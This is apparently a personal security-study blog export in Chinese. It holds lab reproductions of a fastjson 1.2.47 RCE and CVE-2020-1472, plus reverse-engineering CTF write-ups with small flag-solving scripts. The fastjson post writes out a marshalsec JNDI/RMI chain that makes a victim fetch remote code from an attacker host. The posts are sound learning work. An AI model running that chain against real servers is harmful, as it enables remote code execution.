<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0x01第一个docker漏洞环境搭建复现fastjson</title>
    <url>/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/</url>
    <content><![CDATA[<h4 id="第一个docker漏洞环境搭建复现"><a href="#第一个docker漏洞环境搭建复现" class="headerlink" title="第一个docker漏洞环境搭建复现"></a>第一个docker漏洞环境搭建复现</h4><p>由于某原因要进行fastjson漏洞的复现，已获得脚本及exp</p>
<a id="more"></a>

<h5 id="0x1-搭建docker（mac版）"><a href="#0x1-搭建docker（mac版）" class="headerlink" title="0x1 搭建docker（mac版）"></a>0x1 搭建docker（mac版）</h5><p>参考链接：<a href="https://www.runoob.com/docker/macos-docker-install.html">https://www.runoob.com/docker/macos-docker-install.html</a></p>
<p>安装成功后进行初始化</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115207734.png" alt="image-20201109115207734"></p>
<p>问题：发现80端口被占用</p>
<p>解决：<a href="https://blog.csdn.net/haha223545/article/details/105244919%EF%BC%8C%E6%98%AFapache%E5%8D%A0%E7%94%A8%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%81%9C%E6%AD%A2apache%E6%9C%8D%E5%8A%A1%E5%8D%B3%E5%8F%AF%EF%BC%9Asudo">https://blog.csdn.net/haha223545/article/details/105244919，是apache占用了，所以停止apache服务即可：sudo</a> apachectl stop</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115229824.png" alt="image-20201109115229824"></p>
<h5 id="0x2-从git上拉取漏洞环境靶机vulhub（mac需要装好Git）"><a href="#0x2-从git上拉取漏洞环境靶机vulhub（mac需要装好Git）" class="headerlink" title="0x2 从git上拉取漏洞环境靶机vulhub（mac需要装好Git）"></a>0x2 从git上拉取漏洞环境靶机vulhub（mac需要装好Git）</h5><p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115254393.png" alt="image-20201109115254393"></p>
<p>进入后能看到有许多漏洞环境</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115311533.png" alt="image-20201109115311533"></p>
<h5 id="0x3-使用docker"><a href="#0x3-使用docker" class="headerlink" title="0x3 使用docker"></a>0x3 使用docker</h5><p>进入对应的文件夹，使用docker-compose up</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115334588.png" alt="image-20201109115334588"></p>
<p>成功启动，漏洞环境已经搭好</p>
<h5 id="0x4-开始漏洞攻击复现"><a href="#0x4-开始漏洞攻击复现" class="headerlink" title="0x4 开始漏洞攻击复现"></a>0x4 开始漏洞攻击复现</h5><p>从docker中登录受害者靶机，可以查看是否有文件生成</p>
<p>​    docker ps -a：查看ID</p>
<p>​    docker exec -it ID /bin/bash</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115443747.png" alt="image-20201109115443747"></p>
<p>接下来有两种方式：</p>
<p>1、使用另一台计算机作为攻击机和服务器端，进行攻击</p>
<p>2、使用docker搭建一个服务器端，本机作为攻击机（不然攻击机和受害机IP会相同）</p>
<p>第一种方法实践：</p>
<p>选择同一网段下的另一个计算机，搭建服务器端</p>
<p>查看IP，开启python Http服务（注意要和rmi在同一文件夹下开启，不然无法访问到文件的），打开rmi服务</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109114538181.png" alt="image-20201109114538181"></p>
<p>IP为10.141.0.125，攻击语句：</p>
<p>1、python3 -m http.server –bind 0.0.0.0 8888</p>
<p>2、java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://x.x.x.x:8888/#Exploit&quot;">http://x.x.x.x:8888/#Exploit&quot;</a> 9999</p>
<p>3、python3 fastjson-1.2.47_rce.py <a href="http://s.s.s.s:8080/">http://s.s.s.s:8080/</a> rmi://x.x.x.x:9999/Exploit</p>
<p>其中，第一句中的8888端口要与第二句中的8888，端口号可改但须一致，第二句中的9999和第三句中的9999，端口号可改但须一致，x.x.x.x为本机IP，即攻击者ip，s.s.s.s为受害者靶机Ip,端口8080需要根据靶机环境进行更改</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109114938652.png" alt="image-20201109114938652"></p>
<p>攻击成功后，能在受害者靶机上看到exphub文件，在http上也能看见请求</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115025283.png" alt="image-20201109115025283"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>0x01ichunqiu逆向刷题</title>
    <url>/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<h4 id="ichunqiu逆向刷题"><a href="#ichunqiu逆向刷题" class="headerlink" title="ichunqiu逆向刷题"></a>ichunqiu逆向刷题</h4><a id="more"></a>

<h5 id="1、小菜一碟：re100"><a href="#1、小菜一碟：re100" class="headerlink" title="1、小菜一碟：re100"></a>1、小菜一碟：re100</h5><p>下载后，不知道是什么文件，用Notepad先看下</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009173852508.png" alt="image-20201009173852508"></p>
<p>发现关键字符：AndroidManifest.xml</p>
<p>改后缀名为apk，在模拟器中运行看看</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009174041684.png" alt="image-20201009174041684"></p>
<p>猜测是输入flag后会有成功的弹窗之类的</p>
<p>放到Androidkiller里看看</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009173927463.png" alt="image-20201009173927463"></p>
<p>反编译成功，查看一些关键性字符，找到”success”</p>
<p>查看java源码，分析</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009174441430.png" alt="image-20201009174441430"></p>
<p>查看encode加密代码，是md5</p>
<p>所以将字符串”NzU2ZDJmYzg0ZDA3YTM1NmM4ZjY4ZjcxZmU3NmUxODk=”先base64解码，然后Md5解密，然后翻转一下，即可获得flag:jlflag{admin123}</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009174409777.png" alt="image-20201009174409777"></p>
<h5 id="2、Classical-CrackMe"><a href="#2、Classical-CrackMe" class="headerlink" title="2、Classical CrackMe"></a>2、Classical CrackMe</h5><p>是一个exe文件，提示是注册码就是flag，打开运行</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009174631889.png" alt="image-20201009174631889"></p>
<p>猜测会出现”注册成功”的弹窗</p>
<p>放入IDA中，寻找关键字，分析</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009174832915.png" alt="image-20201009174832915"></p>
<p>即可找到对应的字符串，这个编码方式，用base64解码，即可得到flag</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009174917940.png" alt="image-20201009174917940"></p>
<h5 id="3、FindKey-pyc"><a href="#3、FindKey-pyc" class="headerlink" title="3、FindKey-.pyc"></a>3、FindKey-.pyc</h5><p>下载文件，不知道是什么文件，用notepad打开看，能看到有关键字，但是感觉也没有明显特征能说明是什么文件，开始各种猜测</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201110112824228.png" alt="image-20201110112824228"></p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201110112848494.png" alt="image-20201110112848494"></p>
<p>猜了一会儿，后缀名改成.py后能运行了，但是无法直接分析这个.py文件，猜测是加密了</p>
<p>将后缀改成.pyc，使用easy python decompiler反编译，成功，得到一个findkey.pyc_dis文件</p>
<p>打开后可以看到正常的Python代码，Pwda,lookup和pwdb是三个数组，分析</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009175704669.png" alt="image-20201009175704669"></p>
<p>编写一个脚本，思路：</p>
<p>一开始是想随机生成一个长度为17的字符串，然后把这个字符串用判定条件进行判定</p>
<p>但是后来觉得这样跑起来比较复杂费时并且存在一些问题</p>
<p>转换思路：将常用的字符列成数组，根据判定条件跑出每一个字符，最后组成字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">chars &#x3D; [&#39;A&#39;, &#39;a&#39;, &#39;B&#39;, &#39;b&#39;, &#39;C&#39;, &#39;c&#39;, &#39;D&#39;, &#39;d&#39;, &#39;E&#39;, &#39;e&#39;, &#39;F&#39;, &#39;f&#39;, &#39;G&#39;, &#39;g&#39;,</span><br><span class="line">         &#39;H&#39;, &#39;h&#39;, &#39;I&#39;, &#39;i&#39;, &#39;J&#39;, &#39;j&#39;, &#39;K&#39;, &#39;k&#39;, &#39;L&#39;, &#39;l&#39;, &#39;M&#39;, &#39;m&#39;, &#39;N&#39;, &#39;n&#39;, &#39;O&#39;, &#39;o&#39;, &#39;P&#39;, &#39;p&#39;, &#39;Q&#39;, &#39;q&#39;,</span><br><span class="line">         &#39;R&#39;, &#39;r&#39;, &#39;S&#39;, &#39;s&#39;, &#39;T&#39;, &#39;t&#39;, &#39;U&#39;, &#39;u&#39;, &#39;V&#39;, &#39;v&#39;, &#39;W&#39;, &#39;w&#39;, &#39;X&#39;, &#39;x&#39;, &#39;Y&#39;,</span><br><span class="line">         &#39;y&#39;, &#39;Z&#39;, &#39;z&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;-&#39;, &#39;_&#39;, &#39;(&#39;, &#39;)&#39;, &#39;&#123;&#39;, &#39;&#125;&#39;]</span><br><span class="line">for i in range(0, 17):</span><br><span class="line">    for t in range(0, 68):</span><br><span class="line">        m &#x3D; chars[t]</span><br><span class="line">        if ord(m) + pwda[i] &amp; 255 &#x3D;&#x3D; lookup[i + pwdb[i]]:</span><br><span class="line">            flag +&#x3D; m</span><br><span class="line"></span><br><span class="line">flag &#x3D; flag[::-1]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>成功跑出flag：PCTF{PyC_Cr4ck3r}</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009180535166.png" alt="image-20201009180535166"></p>
<h5 id="4、crackme-Python编写异或"><a href="#4、crackme-Python编写异或" class="headerlink" title="4、crackme-Python编写异或"></a>4、crackme-Python编写异或</h5><p>下载文件，运行，发现有特殊字符”flag”</p>
<p>放到IDA里查看</p>
<p>发现能反编译的代码很少，怀疑加壳</p>
<p>查壳，加了ns的壳，搜索一下是北斗的壳，用脱壳机脱了即可</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201010140519865.png" alt="image-20201010140519865"></p>
<p>重新放到IDA中</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201010140526805.png" alt="image-20201010140526805"></p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201010140559743.png" alt="image-20201010140559743"></p>
<p>看到重点代码，编写脚本即可跑出flag</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201010140639734.png" alt="image-20201010140639734"></p>
<p><img src="/Users/kami/Desktop/%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91/CTF%E9%80%86%E5%90%91%E9%A2%98/typora-user-images/image-20201010140648427.png" alt="image-20201010140648427"></p>
<p>编写脚本过程中的问题：</p>
<p>一开始是想使用上次一样的方法，遍历flag字符然后按照原代码进行异或操作，但是由于对异或运算不了解和Python编写不熟，一直跑不出</p>
<p>此题注意：</p>
<p>异或运算：a^b^a=b,a^b=b^a,a^a=0,a^0=a</p>
<p>Python编写异或，ord(),chr(),十六进制的数组方式</p>
<p>可以直接用两个数组异或得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">byte_402130 &#x3D; &#39;this_is_not_flag&#39;</span><br><span class="line">dword_402150 &#x3D; [0x12, 0x4, 0x8, 0x14, 0x24, 0x5C, 0x4A, 0x3D, 0x56, 0x0A, 0x10, 0x67,</span><br><span class="line">                0x0, 0x41, 0x0, 0x1, 0x46, 0x5A, 0x44, 0x42, 0x6E, 0x0C, 0x44, 0x72, 0x0C, 0x0D, 0x40, 0x3E, 0x4B, 0x5F, 0x2, 0x1,</span><br><span class="line">                0x4C, 0x5E, 0x5B, 0x17, 0x6E, 0x0C, 0x16, 0x68, 0x5B, 0x12]</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0, 42):</span><br><span class="line">    flag +&#x3D; chr(ord(byte_402130[i % 16]) ^ dword_402150[i])</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>跑出得到flag{59b8ed8f-af22-11e7-bb4a-3cf862d1ee75}</p>
<h5 id="5、CrackMe01-postmessagew"><a href="#5、CrackMe01-postmessagew" class="headerlink" title="5、CrackMe01-postmessagew"></a>5、CrackMe01-postmessagew</h5><p>查壳，无壳</p>
<p>放到IDA里查看，未搜到关键字，运行，发现有输入框，查看关键函数（如getwindowtext等</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012171116868.png" alt="image-20201012171116868"></p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012171141100.png" alt="image-20201012171141100"></p>
<p>查找主要代码sub_402650（调用了sub_418B95</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012171248771.png" alt="image-20201012171248771"></p>
<p>发现postmessagew函数，在这里可以查看各种函数的定义：<a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-postmessagew">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-postmessagew</a></p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012171342573.png" alt="image-20201012171342573"></p>
<p>postmessagew有四个参数，动态跑一下看看四个参数分别代表什么</p>
<p>动态跑程序时，在getwindowtextw处下断点，然后F8单步运行，跳到Postmessagew时将鼠标放到对应参数上即可看到</p>
<p>lParam:输入字符的个数</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012171443991.png" alt="image-20201012171443991"></p>
<p>wParam:输入的字符</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012171449452.png" alt="image-20201012171449452"></p>
<p>查看句柄hWnd:</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012172152822.png" alt="image-20201012172152822"></p>
<p>除了sub_402650调用以外，还有一个sub_402990函数</p>
<p>跟进去看看</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012172232914.png" alt="image-20201012172232914"></p>
<p>查看调用的函数sub_4027F0</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012172309659.png" alt="image-20201012172309659"></p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012172405031.png" alt="image-20201012172405031"></p>
<p>查看chText数组</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012172330350.png" alt="image-20201012172330350"></p>
<p>注意：是两个字节一起</p>
<p>编写脚本：</p>
<p>final = 0x4B6<br>chText = [0x4F0, 0x4DA, 0x4D7, 0x4D1, 0x48C, 0x4FF, 0x4F5, 0x4FE, 0x4E3, 0x4F8, 0x4E7, 0x4FF, 0x4E3, 0x4E9,<br>          0x4F0, 0x4F3, 0x425, 0x480, 0x484, 0x4F2, 0x4F4, 0x4F3]<br>for i in range(0, 22):<br>            v6 = chr(chText[i] ^ final)<br>            print(v6, end=’’)</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201110114140386.png" alt="image-20201110114140386"></p>
<p>得到flag:ICHUNQIU_FE362DBE</p>
<p>参考：<a href="https://blog.csdn.net/wangtiankuo/article/details/81201853">https://blog.csdn.net/wangtiankuo/article/details/81201853</a></p>
<p><a href="https://www.cnblogs.com/wanghj-dz/p/3973543.html">https://www.cnblogs.com/wanghj-dz/p/3973543.html</a></p>
<p><a href="https://www.cnblogs.com/qq78292959/archive/2012/07/20/2600865.html">https://www.cnblogs.com/qq78292959/archive/2012/07/20/2600865.html</a></p>
<h5 id="6、Smali-smali2java"><a href="#6、Smali-smali2java" class="headerlink" title="6、Smali-smali2java"></a>6、Smali-smali2java</h5><p>下载了一个smali文件，根据搜索，可以将Smali文件转成Java,利用软件smali2java转为java文件</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012173233305.png" alt="image-20201012173233305"></p>
<p>可以看到是一个base64+AES的解密过程</p>
<p>p1是加密的内容，p2是AES密钥</p>
<p>参考：<a href="https://www.cnblogs.com/caizhaokai/p/10944667.html">https://www.cnblogs.com/caizhaokai/p/10944667.html</a></p>
<p>一开始直接解p1的base64，没解出来，然后p1p2都放到AES解密，也没解出来</p>
<p>就想要直接运行java程序跑的，发现有很多包的问题</p>
<p>然后解了一下p2的base64，出了明文</p>
<p>然后放到AES里解密</p>
<p>成功解出flag：PCTF{Sm4liRiver}</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012164303217.png" alt="image-20201012164303217"></p>
<h5 id="7、小菜两碟-PE文件头修复"><a href="#7、小菜两碟-PE文件头修复" class="headerlink" title="7、小菜两碟-PE文件头修复"></a>7、小菜两碟-PE文件头修复</h5><p>一个无法正常打开的文件，用editor看一下，查找到关键字</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013162905495.png" alt="image-20201013162905495"></p>
<p>尝试多种猜测后，应该是个exe，但是无法正常打开，怀疑PE头损坏</p>
<p>参考：<a href="https://www.cnblogs.com/2f28/p/9824366.html">https://www.cnblogs.com/2f28/p/9824366.html</a></p>
<p><a href="https://bbs.pediy.com/thread-248817.htm">https://bbs.pediy.com/thread-248817.htm</a></p>
<p>并打开一个正常的exe文件进行对比</p>
<p>发现两处错误，50450000是PE文件头，3C处是PE文件头地址（E9）</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013163053400.png" alt="image-20201013163053400"></p>
<p>修改为如下情况：</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013163105139.png" alt="image-20201013163105139"></p>
<p>修改之后可以正常放入IDA中分析了，无壳</p>
<p>根据关键字，找到主函数代码，反编译一下，分析</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013163410920.png" alt="image-20201013163410920"></p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013163418420.png" alt="image-20201013163418420"></p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013163442850.png" alt="image-20201013163442850"></p>
<p>可以看到flag是由前三个数字加上’abc’组成的，即v20,21,22</p>
<p>编写脚本跑出前三个数字：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for v20 in range(0, 100):</span><br><span class="line">    for v21 in range(0, 100):</span><br><span class="line">        v22 &#x3D; (v21 ^ v20) + 4</span><br><span class="line">        if(v22 * v21 * v20 &#x2F;&#x2F; 11 &#x3D;&#x3D; 106):</span><br><span class="line">           if((v22 + v21 + v20) % 100 &#x3D;&#x3D; 34):</span><br><span class="line">                print(v20, v21, v22)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013133507441.png" alt="image-20201013133507441"></p>
<p>然后一个个尝试即可</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013163550796.png" alt="image-20201013163550796"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>PE文件头修复</tag>
        <tag>.pyc文件</tag>
        <tag>smali2java</tag>
      </tags>
  </entry>
  <entry>
    <title>0x02CVE-2020-1472漏洞复现</title>
    <url>/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="CVE-2020-1472漏洞复现"><a href="#CVE-2020-1472漏洞复现" class="headerlink" title="CVE-2020-1472漏洞复现"></a>CVE-2020-1472漏洞复现</h4><p>用了大半天时间，开局一张图，复现全靠蒙：</p>
<p>参考宽字节安全的推文：<a href="https://mp.weixin.qq.com/s/MSLbzg2hCoTSVTtEIxxpNQ">https://mp.weixin.qq.com/s/MSLbzg2hCoTSVTtEIxxpNQ</a></p>
<p><a href="https://asciinema.org/a/359607">https://asciinema.org/a/359607</a></p>
<a id="more"></a>

<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915162012996.png" alt="image-20200915162012996"></p>
<h5 id="0x1-搭建一个windows的域环境"><a href="#0x1-搭建一个windows的域环境" class="headerlink" title="0x1 搭建一个windows的域环境"></a>0x1 搭建一个windows的域环境</h5><p>搭建参考：<a href="https://blog.csdn.net/wwl012345/article/details/88934571">https://blog.csdn.net/wwl012345/article/details/88934571</a></p>
<p>发现电脑里有一个win2008r2的虚拟机，就用这个了</p>
<p>更改IP和DNS</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161742282.png" alt="image-20200915161742282"></p>
<p>添加角色</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161849769.png" alt="image-20200915161849769"></p>
<p>根据提示，运行dcpromo.exe添加DNS服务器</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161801701.png" alt="image-20200915161801701"></p>
<p>记录域名</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161902861.png" alt="image-20200915161902861"></p>
<p>此时，域环境已经搭建完成</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161930572.png" alt="image-20200915161930572"></p>
<p>以防万一我还看了下服务里netlogon有没有开</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161950769.png" alt="image-20200915161950769"></p>
<h5 id="0x2-使用kali运行poc脚本进行攻击"><a href="#0x2-使用kali运行poc脚本进行攻击" class="headerlink" title="0x2 使用kali运行poc脚本进行攻击"></a>0x2 使用kali运行poc脚本进行攻击</h5><p>先装一个kali虚拟机，好久没装了中间还出现了点小问题</p>
<p>装完Kali之后，更改下ip和dns服务器，新建一个配置1</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180721906.png" alt="image-20200915180721906"></p>
<p>然后安装impacket,参考：<a href="https://www.freebuf.com/sectool/175208.html">https://www.freebuf.com/sectool/175208.html</a></p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180851531.png" alt="image-20200915180851531"></p>
<p>装好之后拷入poc脚本</p>
<p>之后是导入各种模块和无限的debug…..修改了下脚本</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180942451.png" alt="image-20200915180942451"></p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180900178.png" alt="image-20200915180900178"></p>
<p>运行脚本，复现成功：</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180918659.png" alt="image-20200915180918659"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>netlogon</tag>
        <tag>域</tag>
      </tags>
  </entry>
  <entry>
    <title>0x02xctf新手训练题</title>
    <url>/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/</url>
    <content><![CDATA[<h4 id="xctf新手训练题"><a href="#xctf新手训练题" class="headerlink" title="xctf新手训练题"></a>xctf新手训练题</h4><a id="more"></a>

<h5 id="0x1-open-source"><a href="#0x1-open-source" class="headerlink" title="0x1 open-source"></a>0x1 open-source</h5><p>下载文件后可以直接看源码</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022173337438.png" alt="image-20201022173337438"></p>
<p>要求是输入4个参数，第一个参数为’0xcafe’，第二个参数是符合判定条件的int值，第三个参数是’h4cky0u’，然后进行一些数据操作得到hash，并用十六进制方式输出（%x）</p>
<p>编写脚本实现，得到flag为0xc0ffee</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201021172112641.png" alt="image-20201021172112641"></p>
<h5 id="0x2-simple-unpack"><a href="#0x2-simple-unpack" class="headerlink" title="0x2 simple-unpack"></a>0x2 simple-unpack</h5><p>提示是加了壳的二进制文件，查壳</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022173809443.png" alt="image-20201022173809443"></p>
<p>一开始不知道怎么脱二进制文件的壳，参考：<a href="https://bbs.pediy.com/thread-157645.htm">https://bbs.pediy.com/thread-157645.htm</a></p>
<p>到软件中提示的地址下载脱壳程序进行脱壳（<a href="https://github.com/upx/upx/releases%EF%BC%89">https://github.com/upx/upx/releases）</a></p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022173853002.png" alt="image-20201022173853002"></p>
<p>脱壳成功后用IDA查看，即得到flag</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174038951.png" alt="image-20201022174038951"></p>
